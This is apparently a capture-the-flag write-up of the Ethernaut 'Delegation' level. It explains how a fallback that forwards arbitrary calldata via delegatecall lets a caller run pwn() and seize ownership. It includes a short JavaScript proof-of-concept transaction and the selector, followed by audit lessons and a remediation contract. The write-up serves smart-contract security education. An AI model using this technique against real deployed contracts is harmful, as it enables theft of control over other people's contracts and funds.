---
title: 'Ethernaut - Delegation'
description: 'Exploiting delegatecall forwarding to hijack smart contract ownership. Learn how delegatecall preserves transaction context and storage layouts to execute arbitrary code.'
date: 2025-07-06
tags: ['solidity', 'security', 'delegatecall', 'storage', 'ethernaut', 'ctf']
image: '../../../../public/ethernaut.png'
authors: ['thesandf']
---

# 👥 Delegation - The Delegatecall Takeover

## Challenge Overview

The goal of this level is to **claim ownership** of the `Delegation` contract.

**The Catch:** We are given a `Delegation` contract that does not directly expose any ownership modification functions. However, it references a helper contract called `Delegate` and forwards unrecognized calls to it.

---

## Technical Analysis

### Vulnerability: Uncontrolled Delegatecall to Target Contract

The `Delegation` contract utilizes a fallback function that forwards raw input calldata to the `Delegate` contract:

```solidity
fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
        this;
    }
}
```

#### The Root Cause
The vulnerability stems from the use of **`delegatecall`** on arbitrary user data (`msg.data`):
1. **`delegatecall` Context**: Unlike `call`, `delegatecall` runs the code of the target contract (`Delegate`) inside the context of the calling contract (`Delegation`). This means that `msg.sender`, `msg.value`, and critically, **the storage space** of `Delegation` are used during execution.
2. **Storage Layout Alignment**: Both contracts define `owner` in storage slot 0:
   * `Delegate` slot 0: `owner`
   * `Delegation` slot 0: `owner`
3. **Target Function**: The `Delegate` contract has a public `pwn()` function:
   ```solidity
   function pwn() public {
       owner = msg.sender;
   }
   ```

When we invoke `Delegation` with the calldata `keccak256("pwn()")`:
1. The fallback function in `Delegation` captures the call.
2. It delegatecalls `Delegate` with `msg.data` containing the selector for `pwn()`.
3. The `Delegate` contract's `pwn()` logic executes inside the context of `Delegation`.
4. It sets slot 0 (`owner` in `Delegation`) to `msg.sender` (the player EOA).

---

## The Exploit: The Multi-Step Solution

1. **Calculate the Method Selector**: Calculate the first 4 bytes of `keccak256("pwn()")` (which is `0xdd365b8b`).
2. **Send Raw Transaction**: Send a transaction to the `Delegation` contract with empty value and the calldata set to `0xdd365b8b`.
3. **Verify Takeover**: Check that `Delegation.owner` has been updated to the player address.

---

## Proof of Concept (PoC)

Below is the JavaScript console walkthrough:

```javascript
// Calculate the selector of pwn() and send a transaction triggering the fallback
await sendTransaction({
  from: player,
  to: contract.address,
  data: web3.utils.sha3("pwn()").substring(0, 10) // 0xdd365b8b
});

// Verify ownership transition
const currentOwner = await contract.owner();
console.log("Is player owner?", currentOwner === player);
```

---

## Auditor's Lessons

1. **Delegatecall is Dangerous**: `delegatecall` effectively hands over absolute root privileges of your contract's storage to the target. Never use `delegatecall` with untrusted target addresses or permit arbitrary calldata forwarding without strict access control.
2. **Storage Layout Collision**: When using proxy patterns or delegatecalls, you must ensure the storage layouts of both contracts match perfectly. A collision can lead to unintended state corruption or ownership hijacking.
3. **Validate Selector Execution**: If forwarding calls via fallback, restrict which function selectors are permitted to prevent calling critical initialization or administrative functions.

---

## Remediation

Avoid using `delegatecall` for generic or untrusted proxy setups. If an upgradeable proxy pattern is required, use industry-standard proxy libraries (such as OpenZeppelin's proxy contracts) and restrict storage access using explicit access modifiers:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SecureDelegation {
    address public owner;
    address public delegate;

    constructor(address _delegate) {
        delegate = _delegate;
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // Direct, explicit calls instead of delegating raw inputs
    function upgradeDelegate(address _newDelegate) external onlyOwner {
        delegate = _newDelegate;
    }
}
```
